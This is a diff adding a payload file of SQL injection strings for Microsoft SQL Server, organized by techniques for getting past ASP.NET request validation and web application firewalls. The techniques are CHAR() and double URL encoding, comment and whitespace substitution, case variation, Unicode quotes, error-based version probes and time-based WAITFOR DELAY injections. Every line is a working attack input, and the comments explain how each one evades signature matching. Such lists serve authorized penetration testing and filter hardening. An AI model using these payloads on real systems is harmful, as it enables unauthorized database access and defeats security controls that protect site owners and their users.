@@ -1,0 +1,44 @@
+# ── Encoding and filter bypass payloads ───────────────────────────────────────
+# For when ASP.NET RequestValidation or WAF blocks standard payloads.
+# These avoid < > ' " angle brackets and common signatures.
+
+# ── CHAR() encoded quotes — avoids literal single quote ───────────────────────
+ss CHAR(39) AND 1=CONVERT(int,@@version)-- wXyW
+ss%27 AND 1=CONVERT(int,@@version)-- wXyW
+
+# ── Double URL encoded ────────────────────────────────────────────────────────
+ss%2527 AND 1=CONVERT(int,@@version)-- wXyW
+
+# ── CHAR() fully encoded version probe ────────────────────────────────────────
+# Builds: ' AND 1=CONVERT(int,@@version)--
+ss'+CHAR(32)+CHAR(65)+CHAR(78)+CHAR(68)+CHAR(32)+CHAR(49)+CHAR(61)+CHAR(67)+CHAR(79)+CHAR(78)+CHAR(86)+CHAR(69)+CHAR(82)+CHAR(84)+CHAR(40)+CHAR(105)+CHAR(110)+CHAR(116)+CHAR(44)+CHAR(64)+CHAR(64)+CHAR(118)+CHAR(101)+CHAR(114)+CHAR(115)+CHAR(105)+CHAR(111)+CHAR(110)+CHAR(41)--
+
+# ── Comment variations to break signature matching ───────────────────────────
+ss' AND 1=CONVERT(int,@@version)-- -
+ss' AND 1=CONVERT(int,@@version)#
+ss' AND 1=CONVERT(int,@@version)/*
+
+# ── Whitespace substitution ───────────────────────────────────────────────────
+ss'/**/AND/**/1=CONVERT(int,@@version)--
+ss'%09AND%091=CONVERT(int,@@version)--
+ss'%0aAND%0a1=CONVERT(int,@@version)--
+
+# ── Case variation ────────────────────────────────────────────────────────────
+ss' aNd 1=CoNvErT(iNt,@@VeRsIoN)--
+ss' AnD 1=convert(INT,@@VERSION)--
+
+# ── Nested comment stripping bypass ──────────────────────────────────────────
+ss' AND 1=CONV/**/ERT(int,@@ver/**/sion)--
+
+# ── Unicode/overlong encoding ─────────────────────────────────────────────────
+ss%u0027 AND 1=CONVERT(int,@@version)--
+ss%ef%bc%87 AND 1=CONVERT(int,@@version)--
+
+# ── Scientific notation for numeric comparisons ───────────────────────────────
+ss' AND 1.0e0=1.0e0-- wXyW
+ss' AND 0e0=0e0-- wXyW
+
+# ── Alternative comment styles ────────────────────────────────────────────────
+ss'; WAITFOR DELAY '0:0:5'--
+ss'; WAITFOR DELAY '0:0:5'-- -
+ss'; WAITFOR DELAY '0:0:5';--
